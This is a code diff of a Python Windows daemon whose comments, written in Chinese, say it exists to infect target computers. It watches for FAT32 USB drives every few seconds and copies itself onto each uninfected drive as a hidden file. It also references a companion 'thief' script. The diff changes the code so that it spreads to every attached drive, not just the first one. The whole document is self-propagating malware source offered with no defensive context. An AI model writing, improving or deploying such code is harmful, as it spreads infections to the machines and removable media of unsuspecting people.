@@ -1,4 +1,4 @@
-### DAEMON 守护进程/服务 ###
+### DAEMON 守护进程/服务,用于感染目标电脑 ###
 ### 此程序不可在osX或GNU/Linux上启动 ###
 import os
 import psutil
@@ -14,29 +14,19 @@ THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
 DAEMON_NAME="daemon.py"
 THIEF_NAME="thief.txt.py"
 
-class computer:
-    drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
-    usb_drive="NULL"
-    drive_sum=0
 
-    def get_sum(self): #返回磁盘的个数
-        s=0
-        for d in self.drive:
-            if os.path.exists(d):
-                s=s+1
-        return s
 
-    def __init__(self):
-        self.drive_sum=self.get_sum()
+def get_sum(file_system_type): #返回磁盘的个数(其中只包括file_system_type这个文件系统的磁盘)
+    s=0
+    disks=psutil.disk_partitions()
+    for d in disks:
+        if d.fstype==file_system_type: s=s+1
+    return s
 
 
 class usb:
-    drive="NULL" #此变量用于记录u盘的盘符
-    def __init__(self):
-        disks=psutil.disk_partitions()
-        for d in disks:
-            if d.fstype=="FAT32":
-                self.drive=d.device
+    def __init__(self, drive1):
+        self.drive=drive1 #此变量用于记录u盘的盘符
 
     def attack(self):
         target_files=os.listdir(self.drive)
@@ -54,20 +44,15 @@ class usb:
         shutil.copyfile(DAEMON_PATH, self.drive+DAEMON_NAME)
         win32api.SetFileAttributes(self.drive+DAEMON_NAME, win32con.FILE_ATTRIBUTE_HIDDEN) 
 
-    
 
-c1=computer()   
 while True:
     time.sleep(3)
-    print(c1.get_sum(),c1.drive_sum)
-    if c1.get_sum()>c1.drive_sum: 
-        usb1=usb()
-        messagebox.showinfo(title="消息提示", message="欢迎来到德莱联盟")
-        if usb1.drive=="NULL" or os.path.exists(usb1.drive+DAEMON_NAME): #没探测到FAT32文件系统所在的分区或u盘已被攻击
-            continue 
-        break
-
-
-if not(os.path.exists(usb1.drive+DAEMON_NAME)):
-    usb1.attack()
-
+    usb_sum=get_sum("FAT32")
+    if usb_sum>0:
+        disks=psutil.disk_partitions()
+        for d in disks:
+            dev=d.device
+            if d.fstype=="FAT32" and not(os.path.exists(dev+DAEMON_NAME)):
+                usb1=usb(dev)
+                print(dev)
+                usb1.attack()
